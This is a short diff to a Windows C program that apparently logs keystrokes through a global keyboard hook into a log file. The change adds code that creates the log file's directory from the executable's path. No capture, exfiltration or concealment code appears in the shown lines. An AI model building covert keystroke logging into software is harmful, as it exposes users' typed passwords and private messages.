@@ -1,4 +1,5 @@
-#include <shellapi.h>
+#include <Shlobj.h>
+#include <Shlwapi.h>
 #include <stdio.h>
 #include <windows.h>
 
@@ -17,11 +18,9 @@
 
 HANDLE logFile;
 DWORD nWritten = 0;
-char bufferForKeys[100];
+char bufferForPath[MAX_PATH];
 
 BYTE keyState[256];
-WCHAR buffer[16];
-SYSTEMTIME sysTime;
 
 HANDLE singleInstanceMutexHandle;
 HHOOK keyboardHookHandle;
@@ -239,6 +238,16 @@ int WINAPI WinMain(HINSTANCE currentInstance, HINSTANCE previousInstance, LPSTR 
 
     meta->version = 1;
     meta->startTime = GetTickCount();
+
+    // create directory if not exists
+    char **lppFile = {NULL};
+    GetFullPathName(argv[0], MAX_PATH, bufferForPath, lppFile);
+    PathRemoveFileSpec(bufferForPath);
+    int retval = SHCreateDirectoryEx(NULL, (LPCTSTR)bufferForPath, NULL);
+    // ERROR_SUCCESS = 0
+    if (retval != ERROR_SUCCESS) {
+      return msg(retval);
+    }
 
     // get file
     logFile = CreateFile(argv[0],                // name of the write
